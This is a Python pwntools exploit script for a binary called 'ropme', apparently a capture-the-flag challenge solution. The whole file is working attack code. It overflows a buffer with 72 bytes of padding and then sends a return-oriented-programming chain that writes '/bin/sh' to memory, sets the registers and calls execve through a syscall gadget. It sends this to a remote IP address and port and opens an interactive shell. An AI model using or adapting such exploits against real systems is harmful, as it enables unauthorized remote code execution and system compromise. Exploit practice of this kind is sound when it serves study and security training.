#!/usr/bin/python3
from pwn import *

#shell = gdb.debug("./ropme", "b *0x4012a5\ncontinue")
#shell = process("./ropme")
shell = remote("54.91.159.197", 4455)

offset = 72
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(0x4012a5)  # pop rdx; ret;
payload += p64(0x404028)  # .data
payload += p64(0x401278)  # pop rax; pop rbp; ret;
payload += b"/bin/sh\x00" # string to write
payload += p64(0x0)       # padding for pop
payload += p64(0x401291)  # mov qword ptr [rdx], rax; ret;
payload += p64(0x401283)  # pop rbx; ret;
payload += p64(0x404028)  # .data
payload += p64(0x401288)  # mov rdi, rbx; ret;
payload += p64(0x401278)  # pop rax; pop rbp; ret;
payload += p64(0x0) * 2   # argv = NULL
payload += p64(0x401299)  # mov rsi, rax; ret;
payload += p64(0x4012a5)  # pop rdx; ret;
payload += p64(0x0)       # envp = NULL
payload += p64(0x401278)  # pop rax; pop rbp; ret;
payload += p64(0x3b)      # execve();
payload += p64(0x0)       # padding for pop
payload += p64(0x4012a2)  # syscall; ret;

shell.sendlineafter(b": ", payload)
shell.interactive()
